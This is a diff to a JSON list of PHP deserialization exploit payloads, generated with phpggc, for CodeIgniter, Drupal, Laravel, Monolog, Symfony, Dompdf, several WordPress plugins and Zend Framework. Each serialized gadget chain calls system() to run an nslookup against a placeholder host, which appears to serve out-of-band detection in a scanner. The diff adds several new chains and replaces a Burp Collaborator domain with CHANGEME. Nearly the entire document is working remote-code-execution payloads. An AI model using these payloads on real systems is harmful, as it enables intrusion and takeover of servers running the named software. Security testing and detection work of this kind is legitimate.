@@ -7,6 +7,12 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
+    "name": "CodeIgniter 4.0.0-rc.4 <= 4.0.3+",
+    "gen_with": "./phpggc CodeIgniter4/RCE2 <function> <parameter>",
+    "payload": "O:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:8:\"%00*%00redis\"%3BO:45:\"CodeIgniter\\Session\\Handlers\\MemcachedHandler\":2:{s:12:\"%00*%00memcached\"%3BO:17:\"CodeIgniter\\Model\":7:{s:10:\"%00*%00builder\"%3BO:32:\"CodeIgniter\\Database\\BaseBuilder\":2:{s:6:\"QBFrom\"%3Ba:1:{i:0%3Bs:2:\"()\"%3B}s:2:\"db\"%3BO:38:\"CodeIgniter\\Database\\MySQLi\\Connection\":0:{}}s:13:\"%00*%00primaryKey\"%3BN%3Bs:15:\"%00*%00beforeDelete\"%3Ba:1:{i:0%3Bs:8:\"validate\"%3B}s:18:\"%00*%00validationRules\"%3Ba:1:{s:4:\"id.x\"%3Ba:1:{s:5:\"rules\"%3Ba:2:{i:0%3Bs:6:\"system\"%3Bi:1%3Bs:2:\"dd\"%3B}}}s:13:\"%00*%00validation\"%3BO:33:\"CodeIgniter\\Validation\\Validation\":1:{s:15:\"%00*%00ruleSetFiles\"%3Ba:1:{i:0%3Bs:5:\"finfo\"%3B}}s:2:\"db\"%3BO:38:\"CodeIgniter\\Database\\MySQLi\\Connection\":0:{}s:20:\"cleanValidationRules\"%3Bb:0%3B}s:10:\"%00*%00lockKey\"%3Ba:1:{s:1:\"x\"%3Bs:72:\"nslookup CHANGEME\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
     "name": "Drupal 7.0.8 < ?",
     "gen_with": "./phpggc Drupal7/RCE1 <function> <parameter>",
     "payload": "O:11:\"SchemaCache\":4:{s:6:\"%00*%00cid\"%3Bs:14:\"form_DrupalRCE\"%3Bs:6:\"%00*%00bin\"%3Bs:10:\"cache_form\"%3Bs:16:\"%00*%00keysToPersist\"%3Ba:3:{s:8:\"#form_id\"%3Bb:1%3Bs:8:\"#process\"%3Bb:1%3Bs:9:\"#attached\"%3Bb:1%3B}s:10:\"%00*%00storage\"%3Ba:3:{s:8:\"#form_id\"%3Bs:9:\"DrupalRCE\"%3Bs:8:\"#process\"%3Ba:1:{i:0%3Bs:23:\"drupal_process_attached\"%3B}s:9:\"#attached\"%3Ba:1:{s:6:\"system\"%3Ba:1:{i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}}}}}"
@@ -45,7 +51,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.8.30 (5)",
     "gen_with": "./phpggc Laravel/RCE5 \"system('nslookup CHANGEME');\"",
-    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:98:\"<?php system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B exit%3B ?>\"%3B}}}"
+    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:98:\"<?php system('nslookup CHANGEME')%3B exit%3B ?>\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -57,6 +63,18 @@
     "name": "Monolog 1.18 <= 1.23",
     "gen_with": "./phpggc Monolog/RCE1 <function> <parameter>",
     "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"%00*%00socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BN%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}s:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Monolog 1.5 <= 1.17",
+    "gen_with": "./phpggc Monolog/RCE2 <function> <parameter>",
+    "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:6:\"socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BN%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}s:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Monolog 1.1.0 <= 1.10.0",
+    "gen_with": "./phpggc Monolog/RCE3 <function> <parameter>",
+    "payload": "O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BO:35:\"Monolog\\Handler\\NativeMailerHandler\":7:{s:5:\"%00*%00to\"%3BN%3Bs:10:\"%00*%00subject\"%3BN%3Bs:10:\"%00*%00headers\"%3BN%3Bs:8:\"%00*%00level\"%3BN%3Bs:9:\"%00*%00bubble\"%3Bb:0%3Bs:12:\"%00*%00formatter\"%3BN%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}s:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:9:\"%00*%00bubble\"%3Bb:0%3Bs:12:\"%00*%00formatter\"%3BN%3Bs:13:\"%00*%00processors\"%3BN%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -80,19 +98,19 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 3.3",
     "gen_with": "./phpggc Symfony/RCE1 <command>",
-    "payload": "O:43:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{s:64:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00mergeByLifetime\"%3Bs:9:\"proc_open\"%3Bs:58:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00namespace\"%3Ba:0:{}s:57:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00deferred\"%3Bs:72:\"nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net\"%3B}"
+    "payload": "O:43:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{s:64:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00mergeByLifetime\"%3Bs:9:\"proc_open\"%3Bs:58:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00namespace\"%3Ba:0:{}s:57:\"%00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter%00deferred\"%3Bs:72:\"nslookup CHANGEME\"%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 2.3.42 < 2.6",
-    "gen_with": "./phpggc Symfony/RCE2 <code>",
-    "payload": "O:38:\"Symfony\\Component\\Process\\ProcessPipes\":1:{s:45:\"%00Symfony\\Component\\Process\\ProcessPipes%00files\"%3Ba:1:{i:0%3BO:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"%00Symfony\\Component\\Finder\\Expression\\Expression%00value\"%3BO:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"%00*%00parser\"%3BO:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"%00*%00cache\"%3Ba:1:{s:0:\"\"%3BO:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"%00*%00template\"%3Bs:99:\"<?php system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B%3Bdie()%3B ?>\"%3B}}s:10:\"%00*%00current\"%3BO:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"%00*%00globals\"%3Ba:0:{}}}}}"
+    "gen_with": "./phpggc Symfony/RCE2 \"system('nslookup CHANGEME');\"",
+    "payload": "O:38:\"Symfony\\Component\\Process\\ProcessPipes\":1:{s:45:\"%00Symfony\\Component\\Process\\ProcessPipes%00files\"%3Ba:1:{i:0%3BO:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"%00Symfony\\Component\\Finder\\Expression\\Expression%00value\"%3BO:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"%00*%00parser\"%3BO:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"%00*%00cache\"%3Ba:1:{s:0:\"\"%3BO:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"%00*%00template\"%3Bs:99:\"<?php system('nslookup CHANGEME')%3B%3Bdie()%3B ?>\"%3B}}s:10:\"%00*%00current\"%3BO:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"%00*%00globals\"%3Ba:0:{}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 2.6 <= 2.8.32",
-    "gen_with": "./phpggc Symfony/RCE3 <code>",
-    "payload": "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:51:\"%00Symfony\\Component\\Process\\Pipes\\WindowsPipes%00files\"%3Ba:1:{i:0%3BO:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"%00Symfony\\Component\\Finder\\Expression\\Expression%00value\"%3BO:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"%00*%00parser\"%3BO:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"%00*%00cache\"%3Ba:1:{s:0:\"\"%3BO:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"%00*%00template\"%3Bs:99:\"<?php system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B%3Bdie()%3B ?>\"%3B}}s:10:\"%00*%00current\"%3BO:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"%00*%00globals\"%3Ba:0:{}}}}}"
+    "gen_with": "./phpggc Symfony/RCE3 \"system('nslookup CHANGEME');\"",
+    "payload": "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:51:\"%00Symfony\\Component\\Process\\Pipes\\WindowsPipes%00files\"%3Ba:1:{i:0%3BO:46:\"Symfony\\Component\\Finder\\Expression\\Expression\":1:{s:53:\"%00Symfony\\Component\\Finder\\Expression\\Expression%00value\"%3BO:38:\"Symfony\\Component\\Templating\\PhpEngine\":4:{s:9:\"%00*%00parser\"%3BO:47:\"Symfony\\Component\\Templating\\TemplateNameParser\":0:{}s:8:\"%00*%00cache\"%3Ba:1:{s:0:\"\"%3BO:50:\"Symfony\\Component\\Templating\\Storage\\StringStorage\":1:{s:11:\"%00*%00template\"%3Bs:99:\"<?php system('nslookup CHANGEME')%3B%3Bdie()%3B ?>\"%3B}}s:10:\"%00*%00current\"%3BO:46:\"Symfony\\Component\\Templating\\TemplateReference\":0:{}s:10:\"%00*%00globals\"%3Ba:0:{}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -107,6 +125,18 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
+    "name": "WordPress/Dompdf/RCE1 <= 0.8.5+ (1)",
+    "gen_with": "./phpggc WordPress/Dompdf/RCE1 <function> <parameter>",
+    "payload": "O:19:\"Dompdf\\Adapter\\CPDF\":1:{s:15:\"%00*%00_image_cache\"%3BC:33:\"Requests_Utility_FilteredIterator\":137:{x:i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "WordPress/Dompdf/RCE2 0.7.0 <= 0.8.4 (2)",
+    "gen_with": "./phpggc WordPress/Dompdf/RCE2 <function> <parameter>",
+    "payload": "O:19:\"Dompdf\\Adapter\\CPDF\":1:{s:33:\"%00Dompdf\\Adapter\\CPDF%00_image_cache\"%3BC:33:\"Requests_Utility_FilteredIterator\":137:{x:i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
     "name": "WordPress/Guzzle 4.0.0 <= 6.4.1+ (1)",
     "gen_with": "./phpggc WordPress/Guzzle/RCE1 <function> <parameter>",
     "payload": "O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"%00GuzzleHttp\\Cookie\\SetCookie%00data\"%3BC:33:\"Requests_Utility_FilteredIterator\":163:{x:i:0%3Ba:2:{s:4:\"Name\"%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"Value\"%3Bs:0:\"\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}"  
@@ -116,6 +146,18 @@
     "name": "WordPress/Guzzle 4.0.0 <= 6.4.1+ (2)",
     "gen_with": "./phpggc WordPress/Guzzle/RCE2 <function> <parameter>",
     "payload": "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:41:\"%00GuzzleHttp\\Cookie\\FileCookieJar%00filename\"%3BO:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"%00GuzzleHttp\\Cookie\\SetCookie%00data\"%3BC:33:\"Requests_Utility_FilteredIterator\":163:{x:i:0%3Ba:2:{s:4:\"Name\"%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"Value\"%3Bs:0:\"\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}}"  
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "WordPress/P/EmailSubscribers/RCE1 4.0 <= 4.4.7+",
+    "gen_with": "./phpggc WordPress/P/EmailSubscribers/RCE1 <function> <parameter>",
+    "payload": "O:19:\"IG_Log_Handler_File\":1:{s:10:\"%00*%00handles\"%3BC:33:\"Requests_Utility_FilteredIterator\":137:{x:i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "WordPress/P/EverestForms/RCE1 1.0 <= 1.6.7+",
+    "gen_with": "./phpggc WordPress/P/EverestForms/RCE1 <function> <parameter>",
+    "payload": "O:20:\"EVF_Log_Handler_File\":1:{s:10:\"%00*%00handles\"%3BC:33:\"Requests_Utility_FilteredIterator\":137:{x:i:0%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}%3Bm:a:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -138,8 +180,8 @@
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework ? <= 1.12.20 (1)",
-    "gen_with": "./phpggc ZendFramework/RCE1 <code>",
-    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:23:\"Zend_Filter_PregReplace\":2:{s:16:\"%00*%00_matchPattern\"%3Bs:7:\"/(.*)/e\"%3Bs:15:\"%00*%00_replacement\"%3Bs:83:\"system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B\"%3B}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:6:\"layout\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
+    "gen_with": "./phpggc ZendFramework/RCE1 \"system('nslookup CHANGEME');\"",
+    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:23:\"Zend_Filter_PregReplace\":2:{s:16:\"%00*%00_matchPattern\"%3Bs:7:\"/(.*)/e\"%3Bs:15:\"%00*%00_replacement\"%3Bs:83:\"system('nslookup CHANGEME')%3B\"%3B}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:6:\"layout\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
